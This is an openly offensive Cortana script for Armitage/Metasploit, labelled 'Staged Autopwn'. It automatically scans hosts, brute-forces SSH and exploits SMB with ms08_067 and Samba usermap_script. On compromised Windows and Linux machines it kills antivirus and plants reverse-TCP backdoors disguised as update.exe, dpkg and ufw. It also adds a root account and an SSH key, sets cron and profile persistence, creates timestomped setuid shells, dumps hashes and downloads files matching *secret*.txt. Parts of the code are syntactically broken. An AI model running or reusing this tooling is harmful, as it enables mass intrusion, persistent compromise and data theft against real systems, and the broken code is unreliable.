#Staged Autopwn w/ blacklist (Experimental)(untested)
#Author: Eggsploit
#
#
#This is a combination of a few scripts from github with a little of my own code
#https://github.com/rsmudge/cortana-scripts
#
#The blacklist is to prevent our bot from attacking ips we dont want....
#
#
#Please make sure GenIP.sh is in /opt/ before continuing
#
#
$blacklist = "10.0.0.0"; #Enter the gateway ip here
sub createBlacklist {
	println("[!] Creating blacklist of IPS..please wait")
	println("[>] Blacklist Network: $blacklist")
	cmd($console, "touch /opt/blacklist");
	cmd($console, "echo $blacklist > /opt/blacklist");
	cmd($console, "/opt/GenIP.sh $blacklist"/24" >> /opt/blacklist");
	delete_later /opt/blacklist;
	println("[!] Success. Continuing....")
};
$blacklistRange = cmd($console, "cat /opt/blacklist"); 
$success = 0;
sub checkList {
	db_sync();
	println("[*] Comparing database hosts against blacklist....")
	if (@host_addresses, $1 isin $blacklistRange) {
};

sub startSniffin {
	on host_add {
		if ($1 isin $blacklistRange){
			pass
		}
		sleep(10 * 1000);
		println("[*] msfScanning New Host TCP/UDP on $1");
		$console = console();
		#$console = open_console_tab("TCP/UDPscan_$1"); #Debug use
		cmd($console, "use auxiliary/scanner/portscan/tcp");
		cmd($console, "set THREADS 24");
		cmd($console, "set PORTS 50000, 21, 1720, 80, 143, 3306, 110, 5432, 25, 22, 23, 443, 1521, 50013, 161, 17185, 135, 8080, 4848, 1433, 5560, 512, 513, 514, 445, 5900, 5038, 111, 139, 49, 515, 7787, 2947, 7144, 9080, 8812, 2525, 2207, 3050, 5405, 1723, 1099, 5555, 921, 10001, 123, 3690, 548, 617, 6112, 6667, 3632, 783, 10050, 38292, 12174, 2967, 5168, 3628, 7777, 6101, 10000, 6504, 41523, 41524, 2000, 1900, 10202, 6503, 6070, 6502, 6050, 2103, 41025, 44334, 2100, 5554, 12203, 26000, 4000, 1000, 8014, 5250, 34443, 8028, 8008, 7510, 9495, 1581, 8000, 18881, 57772, 9090, 9999, 81, 3000, 8300, 8800, 8090, 389, 10203, 5093, 1533, 13500, 705, 623, 4659, 20031, 16102, 6080, 6660, 11000, 19810, 3057, 6905, 1100, 10616, 10628, 5051, 1582, 65535, 105, 22222, 30000, 113, 1755, 407, 1434, 2049, 689, 3128, 20222, 20034, 7580, 7579, 38080, 12401, 910, 912, 11234, 46823, 5061, 5060, 2380, 69, 5800, 62514, 42, 5631, 902");
		cmd($console, "set RHOSTS $1");
		cmd($console, "run -j");
		cmd($console, "use auxiliary/scanner/discovery/udp_sweep");
		cmd($console, "set THREADS 24");
		cmd($console, "set BATCHSIZE 256");
		cmd($console, "set RHOSTS $1");
		cmd($console, "run -j");
		#sleep(30 * 1000);
		db_sync(); 
	}
	# auto brute force any boxes with SSH open...
	on service_add_22 {
		println("Attempting to brute force $1");
		auxiliary("scanner/ssh/ssh_login", @($1), %(
			USER_FILE => '/opt/framework3/msf3/data/wordlists/unix_users.txt',
			PASS_FILE => '/opt/framework3/msf3/data/wordlists/unix_passwords.txt'));
	}

	on credential_add {	
		println("This credential works: " . join(" ", @_));
	}

	# auto exploit any Windows boxes
	on service_add_445 {
		println("Exploiting $1 (" . host_os($1) . ")");
		if (host_os($1) eq "Microsoft Windows") {
			exploit("windows/smb/ms08_067_netapi", $1);
		}
		else {
			exploit("multi/samba/usermap_script", $1, $null, $null, 1);
		}
	}
};

sub traceNetworks{
	# trace new networks
	# Step 1. When a session opens, grab its routes.
	on session_sync {
		if (-iswinmeterpreter $1) {
			m_exec($1, "netstat -na");
		}
	}

	# netstat -na | findstr EST
	on exec_netstat {
		$verifyState = "ESTABLISHED";
		$netMask = "255.255.255.255";
		@netstatStuff = parse_table($3, @("Proto", "Local Address", "Foreign Address", "State"));
		foreach $netstatStuff (@netstatStuff) {
			($junk_proto, $junk_localIP, $NewNetIPandPort, $session_state) = values($netstatStuff, @('Proto', 'Local Address', 'Foreign Address', 'State'));
			if ($session_state eq $verifyState) {
				($NewNetIP, $junkPort) = split(':', $NewNetIPandPort);
				$console = console();
				@datatemp = hosts();
				foreach $datatemp (@datatemp) {
					@CurrentHostList[$counterw] = $datatemp;
					$counterw += 1;
				}
				sub criteria { 
					$tempCheck = $1;
					return iff($tempCheck eq $NewNetIP, "match", $null); 
				} 
				$answer1 = search(@CurrentHostList, &criteria); 
				if ($answer1 is $null) {
					println("[*] Discovered Host Route and Added: $NewNetIP");
					route_add($NewNetIP, $netMask, $1);
					cmd($console, "hosts --add $NewNetIP");	
					sleep(5 * 1000);
					db_sync();
				}		
			}
		}
	}
};
sub infect {
	# Script to install/hide a few shells/accounts
	# To Do
	# Update hosts file with fake entries to break patching (evil grade?)
	global('%infected');
	$win_user = 'lls_USER';
	$win_pass = '@pplesauc3';
	$local_ip = lhost();

	on session_open {
		$rhost = session_host($1);
		if (%infected[session_host($1)] != "1") {
	        	if (host_os(session_host($1)) eq "Microsoft Windows") {
				if(-isshell $1) {
					cmd_async("sessions -u $1");
				}
				if(-iswinmeterpreter $1) {
					say("Infecting " . session_host($1));
					m_cmd($1, "getsystem");
					m_cmd($1, "run killav");
					m_cmd($1, "run metsvc");
				
					# Generate Payload
					$r_lport = random_port();
					$win_backdoor = generate("windows/meterpreter/reverse_tcp_allports", lhost(), "20000", %(), "exe");
					$handle2 = openf(">/tmp/update.exe");
					writeb($handle2, $win_backdoor);
		                        closef($handle2);						
						
					m_cmd($1, "upload /tmp/update.exe c:\\\\Windows\\\\System32\\\\"); 
					m_cmd($1, "reg setval -k HKLM\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v update -d \"c:\\\\Windows\\\\System32\\\\update.exe\"");
					m_cmd($1, "run persistence -X -i 60 -p 10000 -r $local_ip");
					m_cmd($1, "run getgui -u $backdoor_user -p $backdoor_pass");
					m_cmd($1, "run gettelnet -u $backdoor_user -p $backdoor_pass");
					$rdp = "creds --add " . session_host($1) . " -p 3389 -u $win_user -P $win_pass";
					cmd_async($rdp);
					$tel = "creds --add " . session_host($1) . " -p 23 -u $win_user -P $win_pass";
					cmd_async($tel);
				
					%infected[session_host($1)] = "1";
					handler("windows/meterpreter/reverse_tcp_allports", "20000", %(LHOST => lhost()));
					handler("windows/meterpreter/reverse_tcp", "10000", %(LHOST => lhost()));
	       		      		handler("windows/metsvc_bind_tcp", "31337", %(LHOST => lhost(), RHOST => $rhost));
					m_cmd($1, "run hashdump");
				}
			}
	        	else if (host_os(session_host($1)) eq "Linux") {
				if (-isshell $1) {
					say("Infecting " . session_host($1));
					s_cmd($1, "mkdir /root/.ssh");
					# on load prompt for keys or generate?
					$handle = openf("/opt/metasploit/msf3/data/armitage/id_dsa.pub");
					$pub_key = readln($handle);
					s_cmd($1, "echo $pub_key >> /root/.ssh/authorized_keys");
					closef($handle);
					s_cmd($1, "echo 'administrator:\$6\$W6D9sKYe\$tPihBsmoYXNNBfDhmkT30tYqMdCtMN.zn9HpczbzVd0YMw9P5dAQnjQ4KqUN/4IG5xs4t1SUZP5k82vi5UWGc0:15578:0:99999:7:::' >> /etc/shadow"); # pass = abc123
					s_cmd($1, "echo 'administrator:x:0:0:nobody,,,,:/:/bin/bash' >>/etc/passwd");
					$ssh = "creds --add " . session_host($1) . " -p 22 -u administrator -P abc123";
				        cmd_async($ssh);
	        	
					# Generate Payload
					$r_lport = random_port();
					$backdoor = generate("linux/x86/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "elf");
					$handle2 = openf(">/tmp/linux_backdoor");
					writeb($handle2, $backdoor);
					closef($handle2);	
		
					# set cron job
					s_cmd($1, "mkdir /etc/cron.5min");
					s_cmd($1, "echo '*/5 * * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.5min )' >> /etc/crontab");
					s_cmd($1, "echo '*/5 * * * * /etc/cron.5min/dpkg' >> /var/spool/cron/crontabs/root");
					s_cmd($1, "chmod 0600 /etc/crontab /etc/cron.5min /var/spool/cron/crontabs/root");
					shell_upload($1, "/tmp/linux_backdoor", "/etc/cron.5min/dpkg");
					s_cmd($1, "chmod 755 /etc/cron.5min/dpkg")
					s_cmd($1, "chattr +i /etc/cron.5min/dpkg");
					delete_later("/etc/cron.5min")
			
					# set profile 
					shell_upload($1, "/tmp/linux_backdoor", "/usr/bin/ufw");
					s_cmd($1, "chmod 775 /usr/bin/ufw");
					s_cmd($1, "echo '/usr/bin/ufw &' >>/etc/profile");
					s_cmd($1, "echo '/usr/bin/ufw &' >>/etc/skel/.profile");
					s_cmd($1, "chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile");	
		
					# Create Backup Shell
					s_cmd($1, "cp /bin/zsh /.kernel; chmod +sss /.kernel; touch -d '4 May 2004' /.kernel; chattr +i /.kernel");
	                		s_cmd($1, "cp /bin/tcsh /tmp/X11.auth; chmod +sss /tmp/X11.auth; touch -d '4 May 2004' /tmp/X11.auth");
					
					%infected[session_host($1)] = "1";		
					
					# Launch our aux shells
					handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST => lhost()));
					auxiliary("scanner/ssh/ssh_login_pubkey", @($rhost), %(USERNAME => 'root', KEY_FILE => '/opt/metasploit/msf3/data/armitage/id_dsa'));
					login("scanner/ssh/ssh_login", @($rhost), "administrator", "abc123", %(LHOST => lhost(), LPORT => random_port()));
				}
			}
			else {
				say("Failed to infect " . session_host($1) . ":" . host_os(session_host($1)));
			}
		}
	}
};

sub waitForSessions {
	on session_open {
		println("Session $1 opened. I got " . session_host($1) . " with " . session_exploit($1));
		infect();
	}
	# bot searches new Windows meterpreter sessions for interesting files 

	debug(7 | 34);

	on exec_dir {
		local('$entry $host');
		$host = session_host($1);
		foreach $entry (split("\n", $3)) {
			if ("*secret*.txt" iswm lc($entry)) {
				say("Downloading: $entry from $host $+ / $+ $1");
				m_download($1, $entry);
			}
		}
	}

	on session_sync {
		if (-iswinmeterpreter $1) {
			m_cmd($1, "cd c:\\");
			m_exec($1, "dir /B /S *secret*.txt");
		}
	}
};
sub greeting{
	println("Hello! I'm Cortana. Lets get started")
}
popup host_bottom {
	$rhost = $1;
	if (%infected[$1] == "1") {
		item "Re-establish connection" {
			if (host_os($1) eq "Microsoft Windows") {
				handler("windows/meterpreter/reverse_tcp_allports", "20000", %(LHOST => lhost()));
                                handler("windows/meterpreter/reverse_tcp", "10000", %(LHOST => lhost()));
                                handler("windows/metsvc_bind_tcp", "31337", %(LHOST => lhost(), RHOST => $rhost));				
				}
			if (host_os($1) eq "Linux") {
                                auxiliary("scanner/ssh/ssh_login_pubkey", @($rhost), %(USERNAME => 'root', KEY_FILE => '/opt/metasploit/msf3/data/armitage/id_dsa'));
                                login("scanner/ssh/ssh_login", @($rhost), "administrator", "abc123", %(LHOST => lhost(), LPORT => random_port()));
				}
		}
	}
sub main {
	db_sync();
	createBlacklist();
	checkList();
	if ($success = 1;) {
		startSniffin();
		traceNetworks();
		waitForSessions();
	}
};
main();